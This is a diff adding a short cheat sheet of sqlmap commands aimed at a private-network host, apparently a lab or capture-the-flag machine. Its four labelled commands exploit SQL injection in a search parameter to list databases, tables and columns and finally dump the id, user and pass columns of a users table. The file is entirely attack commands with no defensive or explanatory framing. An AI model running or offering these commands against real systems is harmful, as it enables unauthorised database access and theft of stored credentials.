@@ -1,0 +1,11 @@
+Enumerate databases
+sqlmap -u http://192.168.57.12/kzMb5nVYJw/420search.php?usrtosearch=test --dbs
+
+Enumerate tables of database
+sqlmap -u http://192.168.57.12/kzMb5nVYJw/420search.php?usrtosearch=test -D seth --tables
+
+Show columns of table within a database
+sqlmap -u http://192.168.57.12/kzMb5nVYJw/420search.php?usrtosearch=test -D seth -T users --columns
+
+Dump specific column values from table within a database
+sqlmap -u http://192.168.57.12/kzMb5nVYJw/420search.php?usrtosearch=test -D seth -T users -C id,user,pass --dump
